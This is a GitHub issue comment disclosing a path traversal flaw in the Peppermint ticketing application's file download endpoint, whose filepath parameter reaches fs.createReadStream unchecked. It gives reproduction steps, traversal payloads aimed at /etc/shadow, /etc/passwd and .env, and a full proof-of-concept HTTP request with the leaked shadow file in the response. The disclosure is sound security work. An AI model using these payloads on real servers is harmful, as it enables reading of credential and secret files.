### **[wbowm15](/wbowm15)** commented [Oct 26, 2023](#issue-1964005471)

| Description When downloading a file attached to a ticket, it was observed to be able to download arbitrary files off the web server due to the filepath query parameter not being validated and passed directly to fs.createReadStream. Instructions to download and run the latest release were followed from here: <https://github.com/Peppermint-Lab/peppermint/tree/master#-installation-with-docker> Steps to Reproduce  1. Login to the application. 2. Create a new ticket. 3. Upload a file. 4. Download the file and intercept the request in Burp Suite. 5. Change the filepath parameter to "../../../../../../etc/shadow" or "../../../../../../etc/passwd" or "./.env"  Proof of Concept Request and Response Request:  ``` POST /api/v1/ticket/1/file/download?filepath=../../../../../../etc/shadow HTTP/1.1 Host: localhost:5000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.00) Gecko/20100101 Firefox/118.0 Accept: application/json, text/plain, */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://localhost:5000/ticket/1 Content-Type: multipart/form-data; boundary=---------------------------9995410711832151211174726991 Content-Length: 61 Origin: http://localhost:5000 Connection: close Cookie: token=<omitted> Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin  -----------------------------9995410711832151211174726991--   ```  Response:  ``` HTTP/1.1 200 OK Date: Sat, 14 Oct 2023 23:28:05 GMT Connection: close Content-Length: 476  root:!::0::::: bin:!::0::::: daemon:!::0::::: adm:!::0::::: lp:!::0::::: sync:!::0::::: shutdown:!::0::::: halt:!::0::::: mail:!::0::::: news:!::0::::: uucp:!::0::::: operator:!::0::::: man:!::0::::: postmaster:!::0::::: cron:!::0::::: ftp:!::0::::: sshd:!::0::::: at:!::0::::: squid:!::0::::: xfs:!::0::::: games:!::0::::: cyrus:!::0::::: vpopmail:!::0::::: ntp:!::0::::: smmsp:!::0::::: guest:!::0::::: nobody:!::0::::: node:!:<omitted for security> nextjs:!:<omitted for security>  ``` Impact Allowing users to download system files, such as /etc/passwd, /etc/shadow, configuration files, application source code, and other users files. The etc/shadow file and .env file were able to be retrieved through the app. References <https://cwe.mitre.org/data/definitions/22.html> <https://portswigger.net/web-security/file-path-traversal> |
